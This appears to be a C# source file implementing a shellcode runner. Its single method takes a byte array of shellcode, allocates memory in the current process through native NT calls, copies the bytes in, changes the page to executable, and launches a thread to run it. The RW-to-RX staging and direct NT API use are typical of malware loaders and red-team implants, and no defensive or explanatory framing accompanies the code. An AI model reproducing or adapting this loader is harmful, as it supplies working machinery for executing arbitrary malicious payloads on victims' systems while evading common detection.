using System;
using System.Runtime.InteropServices;

static class NtThread
{
    internal static bool Run(byte[] sc)
    {
        IntPtr baseAddr = IntPtr.Zero;
        IntPtr sz = (IntPtr)sc.Length;

        int status = NtApi.NtAllocateVirtualMemory(
            NtApi.CurrentProcess, ref baseAddr, IntPtr.Zero, ref sz,
            NtApi.MemCommit | NtApi.MemReserve, NtApi.PageReadWrite);
        if (!NtApi.NtSuccess(status))
            return false;

        Marshal.Copy(sc, 0, baseAddr, sc.Length);

        sz = (IntPtr)sc.Length;
        NtApi.NtProtectVirtualMemory(
            NtApi.CurrentProcess, ref baseAddr, ref sz,
            NtApi.PageExecuteRead, out _);

        status = NtApi.NtCreateThreadEx(
            out IntPtr thread, NtApi.ThreadAllAccess, IntPtr.Zero,
            NtApi.CurrentProcess, baseAddr, IntPtr.Zero,
            0, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        if (!NtApi.NtSuccess(status))
            return false;

        NtApi.NtWaitForSingleObject(thread, 0, IntPtr.Zero);
        NtApi.CloseHandle(thread);
        return true;
    }
}
